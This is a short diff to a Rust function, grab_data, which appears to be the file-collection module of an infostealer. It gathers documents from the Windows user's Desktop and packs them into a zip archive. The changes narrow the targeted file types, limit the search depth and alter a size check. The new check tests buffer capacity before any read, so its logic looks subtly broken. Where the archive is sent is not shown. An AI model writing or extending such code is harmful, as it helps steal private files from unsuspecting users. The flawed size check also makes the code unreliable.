@@ -11,11 +11,11 @@ pub fn grab_data() -> Option<String> {
         let options = FileOptions::default().compression_method(zip::CompressionMethod::Stored);
 
         let glob_string = format!(
-            r"{}/Desktop/*.{{xls,txt,doc,docx,ppt,pptx,odt,xlsx,xlsm,xls}}",
+            r"{}/Desktop/*.{{xls,txt,pdf}}",
             &std::env::var("USERPROFILE").unwrap()
         );
 
-        globwalk::glob(&glob_string)
+        globwalk::glob_builder(&glob_string).max_depth(1).build()
             .ok()?
             .filter_map(|dent| dent.ok())
             .enumerate()
@@ -32,10 +32,12 @@ pub fn grab_data() -> Option<String> {
                             Err(_) => Vec::new(),
                         };
 
-                        if buffer.len() >= 2097152 {
+                        if buffer.capacity() >= 2097152 {
                             println!("{} is too large to be included in the archive", path.display());
                             return;
                         }
+
+
                         if f.read_to_end(&mut buffer).is_ok()
                             && zip_writer
                                 .start_file(path.display().to_string(), options)
